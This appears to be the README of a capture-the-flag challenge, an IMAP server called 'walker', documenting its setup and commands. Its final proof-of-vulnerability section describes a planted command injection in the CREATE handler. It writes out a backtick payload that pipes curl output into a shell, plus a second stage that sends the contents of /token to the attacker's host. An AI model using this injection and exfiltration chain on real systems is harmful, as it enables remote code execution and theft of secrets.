# walker

This challenge implements a portion of the IMAP protocol.

## Setup

To setup the mailbox for a user I provided a python script called setup-walker.py. This takes two arguments,
the username and the hostname. It then creates /home/<userame>/Maildir as well as various subfolders. It also
sends mail via the "mail" command. This would be run wherever walker is running.

Walker needs at least the chess user to be created.

Both the walker challenge and the setup-walker.py script need to be run as root.

## message flags
Flag "P" (passed): the user has resent/forwarded/bounced this message to someone else.
Flag "R" (replied): the user has replied to this message.
Flag "S" (seen): the user has viewed this message, though perhaps he didn't read all the way through it.
Flag "T" (trashed): the user has moved this message to the trash; the trash will be emptied by a later user action.
Flag "D" (draft): the user considers this message a draft; toggled at user discretion.
Flag "F" (flagged): user-defined flag; toggled at user discretion.

## Commands

uid is a Unique Identifier sent by the client for a command. This helps to identify responses to a request.

### CAPABILITY

uid CAPABILITY

example:

a101 CAPABILITY
* CAPABILITY IMAP4rev1 AUTH=PLAIN
a101 OK CAPABILITY completed

### NOOP

uid NOOP

example:
a101 NOOP
a101 OK NOOP completed

### LOGOUT

uid LOGOUT

example:

a101 LOGOUT
* BYE CHESS-IMAP server shutting down
a101 OK LOGOUT completed

### STATUS

uid STATUS <mailbox> ( [MESSAGES | RECENT | UNSEEN | PASSED | REPLIED | SEEN | TRASHED | DRAFT | FLAGGED ]+? )

example:

a101 STATUS inbox (MESSAGES SEEN)
* STATUS inbox (MESSAGES 231 SEEN 50)
a101 OK STATUS completed

### AUTHENTICATE
uid AUTHENTICATE <authtype>

authtype currently needs to be plain

example:
a101 AUTHENTICATE PLAIN
+
<base 64 encoded auth string>
a101 OK LOGIN Ok.

### LOGIN
uid LOGIN <user> <pass>

example:
a101 LOGIN chess chess
a101 OK LOGIN Ok.

### LIST
uid LIST "<mailbox>" "<child>"

Both <mailbox> and <child> can be regular expressions

example:
a101 list "inbox" *
* LIST (\HasChildren) "." "INBOX"
* LIST (\HasChildren) "." "INBOX.childone"
* LIST (\HasNoChildren) "." "INBOX.childone.mbc"
* LIST (\HasNoChildren) "." "INBOX.childone.mbb"
* LIST (\HasNoChildren) "." "INBOX.childone.mba"
* LIST (\HasChildren) "." "INBOX.childtwo"
* LIST (\HasNoChildren) "." "INBOX.childtwo.mbc"
* LIST (\HasNoChildren) "." "INBOX.childtwo.mbb"
* LIST (\HasNoChildren) "." "INBOX.childtwo.mba"
* LIST (\HasChildren) "." "INBOX.childthr"
* LIST (\HasNoChildren) "." "INBOX.childthr.mbc"
* LIST (\HasNoChildren) "." "INBOX.childthr.mbb"
* LIST (\HasNoChildren) "." "INBOX.childthr.mba"
a101 OK LIST completed

### CREATE

uid CREATE <new mailbox>

example:
a101 CREATE inbox.newbox
a101 OK "inbox.newbox" created.

### DELETE

uid DELETE <mailbox>

example:
a101 DELETE inbox.newbox
a101 OK Folder deleted.

### RENAME

uid RENAME <from mailbox> <to mailbox>

example:
a101 RENAME inbox.newbox inbox.oldbox
a101 OK Folder renamed.

### SELECT

uid SELECT <mailbox>

example:
a101 OK LIST completed
a101 SELECT inbox
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 14 EXISTS
* 0 RECENT
a101 OK [READ-WRITE] Ok

### EXPUNGE

uid EXPUNGE

example:
a101 EXPUNGE
* 3 EXPUNGE
* 4 EXPUNGE
* 5 EXPUNGE
* 8 EXPUNGE
a101 OK EXPUNGE completed

### CLOSE

uid CLOSE

example:
a101 CLOSE
a101 OK CLOSE completed

### FETCH

uid FETCH <select> <attributes>

<select> is in the form of a # to retrieve a single message or #:# for a range of messages

<attributes> can be any of [ full | flags | internaldate | rfc822 | rfc822.size | rfc822.header | rfc822.text | envelope | body | body[<headers>] ]

<headers> can be any of the headers found in a mail message

### COPY

uid COPY <select> <destination mailbox>

<select> is in the form of a # to retrieve a single message or #:# for a range of messages

example:

a101 COPY 3:5 inbox.childtwo
a101 OK COPY completed.

### STORE

uid STORE <select> [+|-]FLAGS ( <flags> )

<select> is in the form of a # to retrieve a single message or #:# for a range of messages

FLAGS <flag list>
         Replace the flags for the message (other than \Recent) with the
         argument.
+FLAGS <flag list>
         Add the argument to the flags for the message.
-FLAGS <flag list>
         Remove the argument from the flags for the message.

#### Flags list:

\Seen - Message has been read

\Answered - Message has been answered

\Flagged - Message is "flagged" for urgent/special attention

\Deleted - Message is "deleted" for removal by later EXPUNGE

\Draft - Message has not completed composition (marked as a draft).

## POV -- Apogee Only

The vulnerability is a command injection in the Server::HandleCreate function.

It allows the attacker to craft a command using enclosed back ticks '`' that will be executed
when the chown command is passed to popen.

The pov passes this command to the IMAP server: a create inbox.hello`curl -L localhost:8000 | $SHELL`world

The "localhost" target needs to be set to the host running the POV. After this command is sent, the POV
opens a listening socket on port 8000. After the target connects the POV serves up the following command:

curl -L localhost:8080/`cat /token`

Which does a final request with the data inside /token as the request. The final request will look something like this:

GET /931606baaa7a2b4ef61198406f8fc3f4 HTTP/1.1
Host: localhost:8080
User-Agent: curl/7.58.0
Accept: */*
